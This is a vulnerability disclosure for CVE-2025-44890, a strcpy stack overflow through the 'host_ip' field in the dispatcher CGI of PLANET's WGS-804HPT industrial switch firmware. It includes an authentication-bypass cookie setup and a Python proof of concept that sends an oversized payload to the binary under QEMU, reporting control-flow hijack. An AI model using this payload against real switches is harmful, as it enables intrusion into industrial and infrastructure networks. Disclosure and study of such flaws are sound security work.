---
title: web_snmp_notifyv3_add_post_host_ip
date: 2025-04-20 17:11:29
tags: cve

---



**Affected Product**: FW-WGS-804HPT

**Affected Firmware Versions**:  v1.305b241111

**Vulnerability Type**: Buffer Overflow

**CVE Identifier**: CVE-2025-44890





# FW-WGS-804HPT_v1.305b241111 introduced

The WGS-804HPT-V2 is a ruggedized industrial-grade Ethernet switch designed for harsh environments and mission-critical applications. As part of PLANET Technology's Industrial Automation Series, this 8-port managed switch combines Power over Ethernet (PoE+) capabilities with industrial durability, making it ideal for building automation, smart infrastructure, and IoT deployments.



Official Product Page: https://www.planet.com.tw/en/product/wgs-804hpt-v2







# web_snmp_notifyv3_add_post_host_ip

I discovered a  stack overflow vulnerability in the Planet router.

By analyzing the dispatcher file in the bin directory, I found that the function web_snmp_notifyv3_add_post  contains a stack overflow vulnerability.

The stack overflow can be triggered by host_ip value, which leads to a strcpy stack overflow.

![image-20250321152223389](../res/202503211522484-17451404902459.png)

In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of "20 0 0", and its function is to create a cookie with sufficient permissions to access this route.

```json
20 0 0
```



![image-20250417152740023](../res/image-20250417152740023-174487486104821.png)



![image-20250417152806480](res/image-20250417152806480-174487488758022.png)



Through IDA, it can be seen that the stack space is 0x308

﻿The content of the **poc**.py file is as follows:

```json
import os


a = 0x100F
var_name = "host_ip"
b = 'a' * 0x600
c = "isg_db_type=1111"

poc_content = f"&cmd={a}&{var_name}={b}&{c}"
with open('poc', 'w') as f:
    f.write(poc_content)

command = (
    "sudo chroot . ./qemu-mips-static "
    "-E REQUEST_METHOD=POST "
    "-E HTTP_COOKIE='hid=0' "
    "-L ./lib "
    "-g 1234 "
    "./dispatcher.cgi "
    "< poc"  
)


os.system(command)


```

# Attack result

![image-20250417153343940](../res/image-20250417153343940-174487522554423-17451483784616.png)

![image-20250417153323011](../res/image-20250417153323011-17451483757775.png)



Through the above image, we can see that we have overflowed to 0x264 and successfully hijacked the control flow. If necessary, more can be overflowed.d.
